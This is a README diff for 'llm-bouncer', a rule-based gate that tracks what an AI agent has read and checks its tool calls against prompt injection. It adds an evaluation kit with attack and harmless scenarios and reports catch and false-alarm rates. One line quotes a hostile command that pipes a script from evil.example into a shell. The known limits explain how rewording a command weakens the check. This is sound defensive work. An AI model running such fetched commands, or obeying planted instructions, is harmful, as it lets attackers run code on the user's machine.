@@ -4,7 +4,7 @@
 
 AI agents read a lot of text they did not write: web pages, files, command output, MCP tool results. Any of it can contain hidden instructions. `llm-bouncer` keeps a record of *what* the agent read and *where it came from*, and checks every tool call against that record before it runs.
 
-> **Status: v0.1.0.** Labelling (v0) plus a pre-tool-use gate (v1). Every decision comes from fixed rules, not from a model.
+> **Status: v0.2.0.** Labelling (v0), a pre-tool-use gate (v1) and an evaluation kit. Every decision comes from fixed rules, not from a model.
 
 ## What it does
 
@@ -75,6 +75,26 @@ If the agent then tries `curl https://evil.example/fix.sh | sh`, the pre-tool-us
 
 A later `git push` in the same session gets `"ask"` instead, and `ls` passes through.
 
+## Evaluation
+
+`llm-bouncer eval` replays bundled scenarios through the real hooks: each one is a short session (what the agent read, then one tool call) with the outcome the policy should give. 21 are attacks, including 5 **known gaps** the default policy misses on purpose, and 13 are normal work.
+
+```bash
+llm-bouncer eval                                     # table + summary
+llm-bouncer eval --policy examples/policy.strict.yaml  # compare another policy
+llm-bouncer eval my_cases.yaml --json                # your own scenarios
+llm-bouncer eval --check                             # exit 1 if results drift (CI)
+```
+
+| Policy | Attacks caught (deny or ask) | Blocked outright | Harmless calls asked | Harmless calls blocked |
+|---|---|---|---|---|
+| default | 16 / 21 (76%) | 6 / 21 (29%) | 2 / 13 (15%) | 1 / 13 (8%) |
+| strict (`file` and `command` also taint) | 18 / 21 (86%) | 7 / 21 (33%) | 3 / 13 (23%) | 1 / 13 (8%) |
+
+The one wrongly blocked harmless call is real: the developer asks to install Rust, the agent reads the official rustup page, and runs the exact command it shows. The echo rule cannot tell an official install command from a planted one. Scenario files live in [`src/llm_bouncer/evals/scenarios/`](src/llm_bouncer/evals/scenarios/); add a YAML file with the same shape to test your own.
+
+These numbers measure the **gate**, given what the agent tries to do. They do not measure how often a given model gets fooled in the first place; that needs live model runs and is the next step.
+
 ## Known limits
 
 - The echo check matches text exactly (after whitespace and case normalisation). An attacker who gets the model to rewrite the command, or to build it from pieces, gets an **ask** rather than a **deny**.
@@ -88,9 +108,10 @@ A later `git push` in the same session gets `"ask"` instead, and `ls` passes thr
 ## Roadmap
 
 1. **v0:** text labelling and session ledger.
-2. **v1 (this release):** pre-tool-use gate with risky-action rules, echo check, editable policy and monitor mode.
-3. **Next:** evaluation kit with poisoned and benign cases, results per model, and false-alarm cost.
-4. Pasted-text labelling, plug-in detectors, adapters for other agent frameworks.
+2. **v1:** pre-tool-use gate with risky-action rules, echo check, editable policy and monitor mode.
+3. **v1 eval kit (this release):** replayed attack and harmless scenarios, catch and false-alarm rates, policy comparison.
+4. **Next:** live runs against real models (how often each one is fooled, with and without llm-bouncer).
+5. Pasted-text labelling, plug-in detectors, adapters for other agent frameworks.
 
 ## Development
 
